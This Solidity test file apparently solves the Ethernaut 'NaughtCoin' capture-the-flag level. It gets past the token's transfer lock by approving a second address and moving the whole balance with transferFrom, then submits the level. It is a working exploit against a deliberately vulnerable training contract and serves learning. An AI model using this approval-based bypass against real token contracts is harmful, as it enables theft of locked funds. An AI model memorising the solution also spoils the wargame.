pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/15-NaughtCoin/NaughtCoinFactory.sol';
import '../core/Ethernaut.sol';

contract NaughtCoinTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 10 ether); // fund our attacker contract with 1 ether
  }

  function testNaughtCoinHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
    ethernaut.registerLevel(naughtCoinFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
    NaughtCoin naughtCoinContract = NaughtCoin(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    uint256 _balance = IERC20(naughtCoinContract).balanceOf(attacker);
    assertGt(_balance, 0);

    // as we want to bypass the lockTokens require check
    // we can call a different transfer function from an approved called
    IERC20(naughtCoinContract).approve(address(this), type(uint256).max);
    vm.stopPrank();
    
    // now call from someone else
    vm.prank(address(this));
    naughtCoinContract.transferFrom(attacker, address(0xdead), _balance);

    // Note: this is likely also possible to just call transferFrom as the attack
    // as the transfer() is the only overriden one

    vm.startPrank(attacker);
    uint256 _balanceAfter = naughtCoinContract.balanceOf(attacker);
    assertEq(_balanceAfter, 0);

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}

